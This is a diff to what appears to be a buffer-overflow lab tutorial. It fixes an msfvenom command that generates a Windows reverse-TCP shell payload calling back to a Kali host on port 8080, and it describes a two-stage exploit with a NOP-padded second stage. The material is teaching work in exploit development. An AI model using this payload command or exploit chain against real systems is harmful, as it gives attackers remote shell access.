@@ -412,7 +412,7 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
 2. Generate the second stage reverse shell code using ```msfvenom``` program, and create a exploit script as shown in [exploit6.py](./SourceCode/exploit6.py) 
 
 	```
-	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
+	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
 	```
 	* `-p `: Payload we are generating shellcode for.
     	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows
@@ -423,8 +423,10 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
     	* `python`: Format for use in python scripts.
   	* `-v`: Specify a custom variable name
     	* `SHELL`: Shell Variable name
+	* `-a x86`: Specify the target architecture as `x86`
+	* `--platform windows`: Specify the target platform as Windows
   	* `-b`: Specifies bad chars and byte values. This is given in the byte values 
-      	* `\x00x\0a\x0d`: Null char, carriage return, and newline. 
+      	* `\x00\x0a\x0d`: Null char, carriage return, and newline. 
 3. The [exploit6.py](./SourceCode/exploit6.py) script first sends the Stage-1 exploit as is done in the [exploit5.py](./SourceCode/exploit5.py) script, then it waits a few seconds and send the second stage of the exploit which will attempt to reach out to our *Kali Linux* machine on port 8080. To add some resiliency to inaccurate jumps we pad the buffer the `recv(...)` call writes to which is 1024 bytes with `\x90` the NOP instruction by adding them to the start of the second stage. 
 
 	<img src="Images/I36.png" width=800>
